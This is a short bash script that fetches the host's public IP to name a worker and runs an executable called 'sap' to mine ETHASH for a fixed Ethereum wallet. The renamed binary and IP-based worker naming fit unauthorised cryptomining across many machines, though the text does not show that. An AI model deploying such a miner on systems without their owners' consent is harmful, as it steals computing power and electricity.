#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=eu.cruxpool.com:5555
WALLET=0x294f13e4e35f6052f17469b4fc5617ad78765a07
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-man

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

chmod +x ./sap && ./sap --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --4g-alloc-size 4076
